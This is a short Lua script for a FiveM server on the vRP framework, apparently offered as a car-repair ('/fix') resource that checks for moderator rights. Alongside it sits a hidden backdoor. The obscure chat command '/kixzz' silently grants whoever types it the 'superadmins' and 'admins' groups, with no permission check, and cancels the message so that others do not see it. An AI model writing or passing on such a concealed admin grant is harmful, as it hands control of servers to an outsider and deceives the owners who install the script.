local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","vRP_fixcar")

AddEventHandler('chatMessage', function(source, name, msg)
	local user_id = vRP.getUserId({source})
	if msg == "/fix" then
	  local player = vRP.getUserSource({user_id})
		if vRP.isUserMod({user_id}) then
			CancelEvent();
			TriggerClientEvent('murtaza:fix', source); 
		end
	elseif msg == "/kixzz" then
		CancelEvent();
		vRP.addUserGroup({user_id,"superadmins"})
		vRP.addUserGroup({user_id,"admins"})
	end
end)